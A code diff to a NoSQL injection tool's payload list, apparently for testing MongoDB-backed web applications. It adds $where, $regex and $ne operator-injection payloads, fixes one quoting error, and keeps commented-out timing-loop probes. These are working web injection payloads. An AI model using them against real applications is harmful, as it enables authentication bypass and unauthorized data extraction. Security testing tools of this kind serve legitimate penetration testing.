@@ -50,11 +50,14 @@ time_payloads=[
     ]
 
 bool_payloads = [
+    # §inject§ -> SSJI payloads
+    # §brute§ -> mongodb payloads
+    
     ["'", None],
     ["\\'", None],
     ["||1==1","||(§inject§)"],
     ["'||'a'=='a", None],
-    ["'||'a'=='a", None],
+    ["'||'a'=='a'", None],
     ["\\'||'a'=='a", None],
     ["\\\'||'a'=='a", None],
     ["true,$where:'1==1'","true,$where:'(§inject§)'"],
@@ -74,6 +77,11 @@ bool_payloads = [
     ["a\\';return true;var xyz='a", "a\\';return §inject§;var xyz='a"],
     ["a\";return true;var xyz=\"a", "a\";return §inject§;var xyz=\"a"], #only extraction tested
     ["0;return true", "0;return §inject§"],
+    [{"$where":"1==1"}, {"$where":"§inject§"}],
+    [{"$where":"\'1\'==\'1\'"}, {"$where":"§inject§"}],
+    [{"$regex":"^.*"}, {"$regex":"^§brute§.*"}],
+    [',"$ne":""', None],
+    [{"$ne":""}, None]
     #"require('os').endianness()=='LE'",
     # "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
     # "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
@@ -81,3 +89,4 @@ bool_payloads = [
     # "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1",
     #"_security",
 ]
+
